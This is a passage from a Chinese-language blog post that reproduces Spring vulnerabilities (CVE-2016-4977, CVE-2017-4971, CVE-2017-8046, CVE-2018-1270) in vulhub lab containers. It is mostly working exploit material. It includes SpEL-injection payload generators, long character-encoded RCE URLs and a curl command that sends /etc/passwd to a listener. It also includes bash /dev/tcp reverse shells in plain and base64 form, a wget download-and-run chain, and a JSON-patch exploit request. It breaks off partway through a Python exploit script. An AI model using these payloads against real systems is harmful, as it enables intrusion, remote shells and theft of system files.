[{"title":"Spring总结","url":"/2021/06/22/Spring/","content":"\n**Spring**\n\n<!--more-->\n\n# Spring\n\n## Spring渗透\n\n### Spring Security OAuth2远程命令执行突破(CVE-2016-4977)\n\n#### 影响版本\n\n```\n2.0.0-2.0.9\n1.0.0-1.0.5\n```\n\n#### 漏洞搭建\n\n还是使用P牛的靶场\n\n```\ncd vulhub-master/spring/CVE-2016-4977\nsudo docker-compose up -d\n```\n\n\n\n![image-20210521080906589](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210521080906589.png)\n\n\n\n#### 漏洞复现\n\n访问\n\n```\nhttp://192.168.175.209:8080/\n```\n\n\n\n![image-20210521081105117](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210521081105117.png)\n\n\n\n#### 漏洞验证\n\n访问该url 会进行登录验证\n\n```\nhttp://192.168.175.209:8080/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test\n```\n\n\n\n![image-20210521081127941](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210521081127941.png)\n\n\n\n\n\n默认账号密码是\n\n```\nadmin\nadmin\n```\n\n\n\n登录成功\n\n\n\n![image-20210521081210298](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210521081210298.png)\n\n\n\n#### Poc\n\n我们看一下vulhub提供的Poc\n\n```\n#!/usr/bin/env python\nmessage = input('Enter message to encode:')\npoc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])\nfor ch in message[1:]:\n poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)\npoc += ')}'\nprint(poc)\n```\n\n\n\n这里是java的命令执行\n\n\n\n![image-20210521082836766](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210521082836766.png)\n\n\n\n执行一下poc.py\n\n![image-20210521082811068](../../AppData/Roaming/Typora/typora-user-images/image-20210521082811068.png)\n\n\n\n#### 测试RCE\n\n我们执行的命令是`whoami` 把回显放到表达式中\n\n执行一下\n\n```\nhttp://192.168.175.209:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)))}&client_id=acme&scope=openid&redirect_uri=http://test\n```\n\n执行成功\n\n![image-20210521083111824](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210521083111824.png)\n\n这里注意：只是返回了进程，但实际上是命令执行\n\n这是**无回显RCE**\n\n\n\n#### 测试XXE\n\n先在bash下做测试\n\n```\ncurl 192.168.175.130:8888 -d \"$(cat /etc/passwd)\" \n\nnc -lvp 8888\n```\n\n![image-20210521084442961](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210521084442961.png)\n\n\n\n![image-20210521084453479](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521084453479.png)\n\n\n\n那么就将该命令放入poc中生成最终的payload\n\n\n\n![image-20210521084757291](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210521084757291.png)\n\n\n\n```\nhttp://192.168.175.209:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(57)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(55)).concat(T(java.lang.Character).toString(53)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(58)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(36)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(32)))}\n&client_id=acme&scope=openid&redirect_uri=http://test\n```\n\n\n\n![image-20210521084905830](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210521084905830.png)\n\n\n\n执行成功\n\n\n\n![image-20210521084935684](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521084935684.png)\n\n\n\n但是这边nc反弹之后 后面没有东西了\n\n\n\n![image-20210521085003681](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521085003681.png)\n\n\n\n#### 踩坑记录：\n\n\n\n![image-20210521085950628](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521085950628.png)\n\n\n\n\n\n```\ncurl 192.168.175.130:8888 -d \"$(cat /etc/passwd)\" \nbash -c {echo,Y3VybCAxOTIuMTY4LjE3NS4xMzA6ODg4OCAtZCAiJChjYXQgL2V0Yy9wYXNzd2QpIiA=}|{base64,-d}|{bash,-i}\n```\n\n![image-20210521090037876](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090037876.png)\n\n\n\n![image-20210521090154377](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090154377.png)\n\n\n\n最终的payload\n\n```\nhttp://192.168.175.209:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(88)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(57)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(88)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(61)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}\n&client_id=acme&scope=openid&redirect_uri=http://test\n```\n\n\n\n执行之后 成功回显\n\n\n\n![image-20210521090244473](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090244473.png)\n\n\n\n![image-20210521090223786](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090223786.png)\n\n\n\n\n\n#### 反弹shell\n\n那么这边我直接反弹shell了\n\n上java编码的网站\n\n```\nhttp://www.jackson-t.ca/runtime-exec-payloads.html\n```\n\n\n\n![image-20210521085321594](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521085321594.png)\n\n\n\n```\nbash -i >& /dev/tcp/192.168.175.130/8888 0>&1\nbash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\n```\n\n\n\n将该命令放入Poc中\n\n![image-20210521085526917](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521085526917.png)\n\n\n\n最终的payload：\n\n```\nhttp://192.168.175.209:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}&client_id=acme&scope=openid&redirect_uri=http://test\n```\n\n执行一下\n\n\n\n![image-20210521085717667](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521085717667.png)\n\n成功拿到shell\n\n\n\n![image-20210521085734350](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521085734350.png)\n\n\n\n\n\n#### 优化Poc\n\n```\n#!/usr/bin/env python\nimport base64\nmessage = input('Enter message to encode:')\nmessage = 'bash -c {echo,%s}|{base64,-d}|{bash,-i}' % bytes.decode(base64.b64encode(message.encode('utf-8')))\nprint(message)\npoc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])\nfor ch in message[1:]:\n poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)\npoc += ')}'\nprint(poc)\n```\n\n\n\n![image-20210521090415010](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090415010.png)\n\n\n\n![image-20210521090655856](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090655856.png)\n\n最终的payload\n\n```\nhttp://192.168.175.209:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(88)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(57)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(88)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(61)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}&client_id=acme&scope=openid&redirect_uri=http://test\n```\n\n执行成功后\n\n\n\n![image-20210521090725948](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090725948.png)\n\n\n\n成功回显\n\n\n\n![image-20210521090738364](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090738364.png)\n\n\n\n### Spring Web Flow框架远程代码执行(CVE-2017-4971)\n\n#### 影响版本\n\n```\nSpring WebFlow 2.4.0 - 2.4.4\n```\n\n\n\n#### 触发漏洞需要的两个条件\n\n```\n1.MvcViewFactoryCreator对象的 useSpringBeanBinding参数需要设置为 false（默认值）\n2.flow view对象中设置 BinderConfiguration对象为空\n```\n\n\n\n#### 漏洞搭建\n\n关闭之前的docker镜像\n\n![image-20210521094032174](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521094032174.png)\n\n\n\n还是使用vulhub进行搭建\n\n```\ncd vulhub-master/spring/CVE-2017-4971\nsudo docker-compose up -d\n```\n\n\n\n![image-20210521094341522](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521094341522.png)\n\n\n\n#### 漏洞复现\n\n\n\n\n\n#### 漏洞验证\n\n访问\n\n```\nhttp://192.168.175.209:8080/login\n```\n\n\n\n![image-20210521094412376](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521094412376.png)\n\n\n\n用任意账号/密码登录系统\n\n\n\n![image-20210521094430216](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521094430216.png)\n\n\n\n\n\n![image-20210521094611129](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521094611129.png)\n\n\n\n然后访问id=1的酒店地址\n\n![image-20210521094725512](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521094725512.png)\n\n\n\n\n\n\n\n![image-20210521095055636](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521095055636.png)\n\n\n\n然后进行抓包\n\n\n\n![image-20210521095217172](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521095217172.png)\n\n\n\n\n\n![image-20210521095326142](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521095326142.png)\n\n#### Poc(反弹shell)\n\n```\n_(new java.lang.ProcessBuilder(\"bash\",\"-c\",\"bash -i >& /dev/tcp/192.168.175.130/8888 0>&1\")).start()=vulhub\nURL编码后：\n_(new java.lang.ProcessBuilder(\"bash\",\"-c\",\"bash+-i+>%26+/dev/tcp/192.168.175.130/8888 0>%261\")).start()=vulhub\n```\n\n进行执行\n\n\n\n![image-20210521101939418](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521101939418.png)\n\n\n\n成功拿到反弹shell\n\n![image-20210521101957457](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521101957457.png)\n\n\n\n#### EXP拓展\n\n执行命令\n\n```\n&_T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/success\")\n或者\n&_(new+java.lang.ProcessBuilder(\"touch /tmp/success2\")).start()=test\n```\n\n\n\n![image-20210521102426141](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521102426141.png)\n\n\n\n![image-20210521102447095](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521102447095.png)\n\n\n\n远程下载脚本 并执行\n\n```\n&_T(java.lang.Runtime).getRuntime().exec(\"/usr/bin/wget -qO /tmp/1 http://192.168.175.130:8888/1\")\n\n&_T(java.lang.Runtime).getRuntime().exec(\"/bin/bash /tmp/1\")\n```\n\n\n\n### Spring data Rest远程命令执行命令(CVE-2017-8046)\n\n### 影响版本\n\n```\nSpring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3\nSpring Boot version < 2.0.0M4\nSpring Data release trains < Kay-RC3\n```\n\n\n\n#### 漏洞搭建\n\n关闭之前的docker镜像\n\n\n\n![image-20210521102823896](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521102823896.png)\n\n\n\n```\ncd vulhub-master/spring/CVE-2017-8046\nsudo docker-compose up -d\n```\n\n\n\n![image-20210521103116167](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521103116167.png)\n\n\n\n#### 漏洞复现\n\n访问\n\n![image-20210521103134848](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521103134848.png)\n\n#### 漏洞验证\n\n访问\n\n```\nhttp://192.168.175.209:8080/customers/1\n```\n\n![image-20210521103330023](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521103330023.png)\n\n\n\n进行抓包\n\n\n\n![image-20210521103417353](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521103417353.png)\n\n修改成PATCH请求\n\n#### Poc\n\n```\nPATCH /customers/1 HTTP/1.1\nHost: 192.168.175.209:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/json-patch+json\nContent-Length: 210\n[{ \"op\": \"replace\", \"path\": \"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname\", \"value\": \"vulhub\" }]\n```\n\n进行执行\n\n\n\n![image-20210521104331898](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521104331898.png)\n\n然后我们去docker底层看一下\n\n\n\n可以看到是成功创建的\n\n\n\n![image-20210521123013062](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521123013062.png)\n\n\n\n#### Poc原理+反弹shell\n\n\n\n```\n\",\".join(map(str, (map(ord,\"touch /tmp/a001\"))))\n'116,111,117,99,104,32,47,116,109,112,47,97,48,48,49'\n```\n\n\n\n![image-20210521123140977](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521123140977.png)\n\n\n\n\n\n反弹shell\n\n\n\n```\nbash -i >& /dev/tcp/192.168.175.130/8888 0>&1\nbash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\n```\n\n\n\n![image-20210521124108717](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521124108717.png)\n\n\n\n```\n\",\".join(map(str, (map(ord,\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\"))))\n```\n\n![image-20210521124214334](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521124214334.png)\n\n\n\n```\n98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,51,78,83,52,120,77,122,65,118,79,68,103,52,79,67,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125\n```\n\n进行执行\n\n\n\n![image-20210521124336095](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521124336095.png)\n\n\n\n成功反弹shell\n\n![image-20210521124346504](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521124346504.png)\n\n\n\n### Spring Messaging远程命令执行突破(CVE2018-1270)\n\n#### 影响版本\n\n```\nSpring Framework 5.0 to 5.0.4.\nSpring Framework 4.3 to 4.3.14\n已经不支持的旧版本依然受到影响\n```\n\n#### 漏洞搭建\n\n```\ncd \nsudo docker-compose up -d\n```\n\n\n\n![image-20210522092202285](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522092202285.png)\n\n\n\n#### 漏洞复现\n\n\n\n![image-20210522092220807](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522092220807.png)\n\n\n\n\n\n访问\n\n```\nhttp://192.168.175.209:8080/gs-guide-websocket\n```\n\n\n\n![image-20210522092400364](C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210522092400364.png)\n\n\n\n\n\n#### Poc\n\n```\n#!/usr/bin/env python3\nimport requests\nimport random\nimport string\nimport time\nimport threading\nimport logging\nimport sys\nimport json\n\nlogging.basicConfig(stream=sys.stdout, level=logging.INFO)\n\ndef random_str(length):\n    letters = string.ascii_lowercase + string.digits\n    return ''.join(random.choice(letters) for c in range(length))\n\n\nclass SockJS(threading.Thread):\n    def __init__(self, url, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'\n        self.daemon = True\n        self.session = requests.session()\n        self.session.headers = {\n            'Referer': url,\n            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'\n        }\n        self.t = int(time.time()*1000)\n\n    def run(self):\n        url = f'{self.base}/htmlfile?c=_jp.vulhub'\n        response = self.session.get(url, stream=True)\n        for line in response.iter_lines():\n            time.sleep(0.5)\n    \n    def send(self, command, headers, body=''):\n        data = [command.upper(), '\\n']\n\n        data.append('\\n'.join([f'{k}:{v}' for k, v in headers.items()]))\n        \n        data.append('\\n\\n')\n        data.append(body)\n        data.append('\\x00')\n        data = json.dumps([''.join(data)])\n\n        response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)\n        if response.status_code != 204:\n            logging.info(f\"send '{command}' data error.\")\n        else:\n            logging.info(f\"send '{command}' data 